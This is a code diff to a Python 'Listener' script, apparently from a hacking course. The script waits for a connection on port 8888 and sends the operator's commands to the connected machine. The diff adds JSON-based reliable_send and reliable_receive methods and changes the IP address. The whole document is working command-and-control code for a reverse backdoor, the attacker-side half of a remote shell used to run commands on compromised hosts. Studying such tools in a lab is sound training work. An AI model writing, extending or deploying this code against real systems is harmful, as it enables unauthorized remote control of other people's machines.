@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 
+import json
 import socket
 
 
@@ -15,9 +16,26 @@ class Listener:
         self.connection, address = listener.accept()
         print("[+] Got a connection from " + str(address))
 
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_receive(self):
+        """
+        It keeps on appending to json_data until it receives the full data
+        :return: string
+        """
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
     def execute_command(self, command):
-        self.connection.send(command)
-        return self.connection.recv(1024)
+        self.reliable_send(command)
+        return self.reliable_receive()
 
     def run(self):
         while True:
@@ -25,5 +43,5 @@ class Listener:
             print(self.execute_command(command))
 
 
-my_listener = Listener("192.168.225.179", 8888)
+my_listener = Listener("192.168.225.95", 8888)
 my_listener.run()
